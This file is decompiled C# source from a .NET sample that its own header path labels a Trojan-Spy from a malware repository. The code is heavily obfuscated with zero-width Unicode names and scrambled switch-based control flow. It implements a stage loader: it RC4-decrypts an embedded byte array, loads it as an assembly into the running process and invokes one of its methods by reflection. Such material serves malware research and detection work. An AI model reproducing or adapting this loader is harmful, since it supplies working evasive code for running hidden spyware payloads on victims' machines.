// Decompiled with JetBrains decompiler
// Type: ICategoryMembershipDataEntry.Assembly
// Assembly: HStringMarshaler, Version=48.18.3.2, Culture=neutral, PublicKeyToken=null
// MVID: C9C3DCB9-2BA4-424F-9339-2594708EFA64
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Solmyr.gen-61b469d1f7dd980add5fef67a976c5ede46680ae91ab253e216d5e99d2b91992.exe

using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace ICategoryMembershipDataEntry
{
  public class Assembly
  {
    public Assembly(ushort a, int b, bool c, string FormatterTypeStyle, double z)
    {
label_1:
      int num1 = -909558972;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1364489872)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 1198926471 ^ -1488144936;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      this.WSTRBufferMarshaler(this.FourAr((byte[]) Assembly.\u206B⁯⁬‭‎⁫⁬‍‮⁫‬‭‍⁫⁭‬‬‏⁪‮‮‌⁮‮‫‌‬⁪‍‮‏⁯⁬‎⁮​⁫​⁭‌‮(Assembly.\u200F‍‫⁬‌⁪‎‏‮⁫‎‪​‭​‏⁮‬⁭‭‮‪‎⁮⁬‪⁯⁯‫‪⁪‎⁬‍‏‌‎⁬‬‮(OffsetAndRule.ParsingInfo.\u200D⁭⁪⁭‌⁬⁬​‪‏⁯⁮⁭‎‭⁯‎⁫‎⁭‫‎‏⁪⁯‬‎‬‌‬‭​​⁬‎‍⁯⁯‭‬‮<string>(667770206U)), OffsetAndRule.ParsingInfo.\u206F‬⁪‍⁯⁮​‪‮‭‬⁪‮⁪⁬‍⁯‎‭‎⁬‌‬‌⁬‏⁬‬‮‏‮⁪⁭‍‬⁪‫‫⁫‬‮<string>(478043884U), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
      {
        (object) FormatterTypeStyle
      })));
    }

    public int WSTRBufferMarshaler(byte[] EqualityComparer)
    {
label_1:
      int num1 = 319926353;
      System.Reflection.Assembly assembly;
      Type type;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 34964735)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            type = Assembly.\u200F⁯‍‮‏⁮‌⁪⁫‪⁮‍‏‪​‭‮‮‬⁬⁬‮⁮⁬‏⁬⁭‭⁮⁫‮‎‭‍‌‏‏‮‎‏‮(assembly)[18];
            num1 = (int) num3 * -1881377973 ^ 1517442031;
            continue;
          case 2:
            assembly = Assembly.\u206E‬⁭‌‪⁯⁫‏⁪⁮‌‮‭⁫‭‍⁬⁮‬​⁭⁭‬⁭‬‮⁫‍‪⁭‮‍⁮‍‬‬‎⁮⁫‎‮(Assembly.\u200D⁭⁬‭‍⁪⁭‮‬​‭‏​‭‪‎‬‎‮‮⁭⁬⁯⁯‫‬‎​​‭⁭‬⁪‮⁮‪⁪‬⁭‍‮(), EqualityComparer);
            num1 = (int) num3 * 822189937 ^ -1468453817;
            continue;
          case 3:
            Assembly.\u206B⁯⁬‭‎⁫⁬‍‮⁫‬‭‍⁫⁭‬‬‏⁪‮‮‌⁮‮‫‌‬⁪‍‮‏⁯⁬‎⁮​⁫​⁭‌‮(type, OffsetAndRule.ParsingInfo.\u202A‭⁬‬‪‌⁯‬‬‭⁮⁪‪‏⁪⁬‪​‪‬⁯‌⁭‬⁫​⁬⁪‏‭‏‎‏⁮⁬‌⁫‬‍⁬‮<string>(1531562659U), BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) new string[3]
            {
              CallConvFastcall.WaitHandle.ExclusiveScheduler,
              CallConvFastcall.WaitHandle.IdentityAuthority,
              OffsetAndRule.ParsingInfo.\u200C⁭⁪‌⁮‮‏‏⁬⁮​‭‬‎‏‪⁭‭‭⁫⁯⁬‏⁫⁭‎‏​‍⁮‎⁫‮‌‍‮⁯⁯⁪⁬‮<string>(426519946U)
            });
            num2 = 2048;
            num1 = (int) num3 * 136914337 ^ -921423802;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return num2;
    }

    public byte[] FourAr(byte[] D1)
    {
label_1:
      int num1 = -346838151;
      uint[] numArray1;
      uint index1;
      bool flag1;
      byte[] numArray2;
      byte[] numArray3;
      bool flag2;
      uint index2;
      byte[] numArray4;
      bool flag3;
      int index3;
      int num2;
      uint num3;
      while (true)
      {
        uint num4;
        switch ((num4 = (uint) (num1 ^ -608654181)) % 35U)
        {
          case 1:
            num1 = -2030903492;
            continue;
          case 2:
            index1 = 0U;
            num1 = (int) num4 * 2145534276 ^ -1029298400;
            continue;
          case 3:
            numArray1[checked ((int) index2)] = num3;
            numArray2[index3] = checked ((byte) ((int) D1[index3] ^ unchecked ((int) numArray1[checked ((int) (ulong) ((long) (numArray1[(int) index1] + numArray1[(int) index2]) & (long) byte.MaxValue))])));
            num1 = (int) num4 * -1966531003 ^ 323110308;
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num4 * 1588200583 ^ 17825167;
            continue;
          case 6:
            int num5 = index1 <= (uint) byte.MaxValue ? -1271954102 : (num5 = -235806625);
            num1 = num5 ^ (int) num4 * -1425333353;
            continue;
          case 7:
            index1 = 0U;
            num1 = (int) num4 * 1403846216 ^ -1231968165;
            continue;
          case 8:
            num1 = (int) num4 * 1215415437 ^ -1052440750;
            continue;
          case 9:
            numArray1[checked ((int) index2)] = num3;
            num1 = (int) num4 * 664773392 ^ -1752500134;
            continue;
          case 10:
            int num6 = !flag2 ? 416397290 : (num6 = 858327974);
            num1 = num6 ^ (int) num4 * 942892265;
            continue;
          case 11:
            numArray3 = numArray2;
            num1 = (int) num4 * 497739799 ^ -1573802557;
            continue;
          case 12:
            num1 = -1872393603;
            continue;
          case 13:
            num1 = -1098369148;
            continue;
          case 14:
            num1 = -782678381;
            continue;
          case 15:
            numArray1[checked ((int) index1)] = index1;
            num1 = (int) num4 * -1103711609 ^ 462581057;
            continue;
          case 16:
            numArray4 = Assembly.\u206F⁯‎‫‌⁫​⁭‬‪‏⁯‎⁬⁬‪⁪⁬⁫⁫‎‌‌‮‎⁬⁫‬‪‪‭‎‏⁪‮‍‍‫‌‫‮(Assembly.\u206D​‪‫‎‫⁯⁪‫‌⁮‏⁮⁬‍⁮‍‬⁬​⁫⁭‍‭⁭⁭‭‍‏‫‮⁬‭‬⁫⁮‏‮⁬‭‮(), OffsetAndRule.ParsingInfo.\u206E​⁬⁪‪⁬⁯‭‮‌⁯​‮‏⁯‭⁬⁪‪‬⁫‬⁪⁫​‭⁮‌⁪‌‭⁮‍​​⁬‪⁬‎‏‮<string>(2023379120U));
            num1 = (int) num4 * -654444500 ^ 1974156179;
            continue;
          case 17:
            numArray1[checked ((int) index1)] = numArray1[checked ((int) index2)];
            num1 = (int) num4 * 1668136399 ^ 850050286;
            continue;
          case 18:
            index2 = checked ((uint) ((long) (index2 + (uint) numArray4[(int) unchecked ((ulong) index1 % checked ((ulong) numArray4.Length))] + numArray1[(int) index1]) & (long) byte.MaxValue));
            num1 = -909529576;
            continue;
          case 19:
            num3 = numArray1[checked ((int) index1)];
            numArray1[checked ((int) index1)] = numArray1[checked ((int) index2)];
            num1 = (int) num4 * 2066523201 ^ -95934232;
            continue;
          case 20:
            flag2 = index3 == 0;
            num1 = (int) num4 * -1152267550 ^ 648083781;
            continue;
          case 21:
            checked { ++index1; }
            num1 = (int) num4 * -394241429 ^ -2085366678;
            continue;
          case 22:
            num1 = (int) num4 * -633309358 ^ -82996866;
            continue;
          case 23:
            index2 = 0U;
            num2 = checked (numArray2.Length - 1);
            index3 = 0;
            num1 = (int) num4 * -195502717 ^ 1434897737;
            continue;
          case 24:
            num1 = (int) num4 * -391881854 ^ -125084176;
            continue;
          case 25:
            checked { ++index1; }
            num1 = (int) num4 * 2106093223 ^ 1992872490;
            continue;
          case 26:
            index1 = 0U;
            num1 = (int) num4 * -1666963054 ^ 1189101107;
            continue;
          case 27:
            numArray1 = new uint[256];
            num1 = (int) num4 * 2096900592 ^ -1191464841;
            continue;
          case 28:
            checked { ++index3; }
            num1 = (int) num4 * -846958638 ^ -1979224412;
            continue;
          case 29:
            int num7 = flag3 ? 1613929846 : (num7 = 347984010);
            num1 = num7 ^ (int) num4 * 1802249211;
            continue;
          case 30:
            flag1 = index1 <= (uint) byte.MaxValue;
            num1 = (int) num4 * -1100305142 ^ -312126282;
            continue;
          case 31:
            int num8 = !flag1 ? -502915293 : (num8 = -662696396);
            num1 = num8 ^ (int) num4 * -444834845;
            continue;
          case 32:
            index1 = checked ((uint) (unchecked ((long) checked ((ulong) index1 + 1UL)) & (long) byte.MaxValue));
            index2 = checked ((uint) ((long) (index2 + numArray1[(int) index1]) & (long) byte.MaxValue));
            num3 = numArray1[checked ((int) index1)];
            num1 = (int) num4 * -315798250 ^ -911862729;
            continue;
          case 33:
            flag3 = index3 > num2;
            num1 = -510380404;
            continue;
          case 34:
            numArray2 = new byte[checked (D1.Length - 1 + 1 - 1 + 1)];
            num1 = (int) num4 * 682024460 ^ 1691121764;
            continue;
          default:
            goto label_36;
        }
      }
label_36:
      return numArray3;
    }

    static Type \u200F‍‫⁬‌⁪‎‏‮⁫‎‪​‭​‏⁮‬⁭‭‮‪‎⁮⁬‪⁯⁯‫‪⁪‎⁬‍‏‌‎⁬‬‮([In] string obj0) => Type.GetType(obj0);

    static object \u206B⁯⁬‭‎⁫⁬‍‮⁫‬‭‍⁫⁭‬‬‏⁪‮‮‌⁮‮‫‌‬⁪‍‮‏⁯⁬‎⁮​⁫​⁭‌‮(
      [In] Type obj0,
      [In] string obj1,
      [In] BindingFlags obj2,
      [In] Binder obj3,
      [In] object obj4,
      [In] object[] obj5)
    {
      return obj0.InvokeMember(obj1, obj2, obj3, obj4, obj5);
    }

    static AppDomain \u200D⁭⁬‭‍⁪⁭‮‬​‭‏​‭‪‎‬‎‮‮⁭⁬⁯⁯‫‬‎​​‭⁭‬⁪‮⁮‪⁪‬⁭‍‮() => Thread.GetDomain();

    static System.Reflection.Assembly \u206E‬⁭‌‪⁯⁫‏⁪⁮‌‮‭⁫‭‍⁬⁮‬​⁭⁭‬⁭‬‮⁫‍‪⁭‮‍⁮‍‬‬‎⁮⁫‎‮(
      [In] AppDomain obj0,
      [In] byte[] obj1)
    {
      return obj0.Load(obj1);
    }

    static Type[] \u200F⁯‍‮‏⁮‌⁪⁫‪⁮‍‏‪​‭‮‮‬⁬⁬‮⁮⁬‏⁬⁭‭⁮⁫‮‎‭‍‌‏‏‮‎‏‮([In] System.Reflection.Assembly obj0) => obj0.GetTypes();

    static Encoding \u206D​‪‫‎‫⁯⁪‫‌⁮‏⁮⁬‍⁮‍‬⁬​⁫⁭‍‭⁭⁭‭‍‏‫‮⁬‭‬⁫⁮‏‮⁬‭‮() => Encoding.BigEndianUnicode;

    static byte[] \u206F⁯‎‫‌⁫​⁭‬‪‏⁯‎⁬⁬‪⁪⁬⁫⁫‎‌‌‮‎⁬⁫‬‪‪‭‎‏⁪‮‍‍‫‌‫‮([In] Encoding obj0, [In] string obj1) => obj0.GetBytes(obj1);
  }
}
